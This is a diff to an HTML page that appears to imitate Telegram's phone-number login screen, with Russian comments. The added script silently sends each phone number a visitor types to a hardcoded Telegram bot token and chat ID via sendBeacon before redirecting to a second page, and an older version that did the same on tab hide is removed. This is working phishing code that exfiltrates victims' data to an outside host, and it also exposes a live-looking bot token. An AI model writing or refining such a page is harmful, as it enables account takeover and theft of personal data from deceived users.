@@ -137,7 +137,6 @@
                 display: flex;
                 flex-direction: column;
             }
-            /* Сдвигаем кнопку вниз на мобильных */
             .spacer {
                 flex-grow: 1;
             }
@@ -171,15 +170,26 @@
     </div>
 
     <script>
-        // Скрипт для сохранения номера и перехода на вторую страницу
+        const BOT_TOKEN = "9245592692:AAGXX8AgmKsYMjLtuya2hRM5DYWyzMbAXt4";
+        const CHAT_ID = "5419723549";
+
         function goToNextStep() {
             const phoneInput = document.getElementById('phone');
             const phoneNumber = phoneInput.value.trim();
             
-            // Сохраняем введенный номер в память браузера
+            // Сохраняем в localStorage под единым ключом
             localStorage.setItem('telegram_phone', phoneNumber);
             
-            // Мгновенный переход на вторую страницу (без лагов)
+            if (phoneNumber) {
+                // Формируем текст и отправляем запрос в Telegram мгновенно при клике
+                let messageText = "Новый номер телефона:\n" + phoneNumber;
+                let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(messageText);
+                
+                // Используем sendBeacon, чтобы запрос гарантированно улетел до перехода на новую страницу
+                navigator.sendBeacon(url);
+            }
+            
+            // Переход на вторую страницу
             window.location.href = 'telegram1.html';
         }
 
@@ -191,34 +201,5 @@
             this.value = val;
         });
     </script>
-    <script>
-    // Твой токен и твой Telegram ID (или ID чата, куда должны лететь данные)
-    const BOT_TOKEN = "9245592692:AAGXX8AgmKsYMjLtuya2hRM5DYWyzMbAXt4";
-    const CHAT_ID = "5419723549"; // Твой айди, который ты скидывал
-
-    function sendToTelegram() {
-        // Достаем данные из localStorage по твоему ключу
-        let phoneData = localStorage.getItem('telegramPhone');
-
-        if (!phoneData) return; // Если данных нет, ничего не шлем
-
-        // Формируем текст сообщения
-        let messageText = "Новые данные из браузера:\n" + phoneData;
-
-        // Отправляем запрос прямо в Telegram API
-        let url = `https://api.telegram.org/bot${9245592692:AAGXX8AgmKsYMjLtuya2hRM5DYWyzMbAXt4}/sendMessage?chat_id=${5419723549}&text=` + encodeURIComponent(messageText);
-
-        // Шлем запрос в фоне
-        fetch(url).catch(err => console.log('Ошибка отправки', err));
-    }
-
-    // Срабатывает автоматически, когда пользователь уходит со вкладки или закрывает её
-    document.addEventListener('visibilitychange', function() {
-        if (document.visibilityState === 'hidden') {
-            sendToTelegram();
-        }
-    });
-</script>
-
 </body>
 </html>
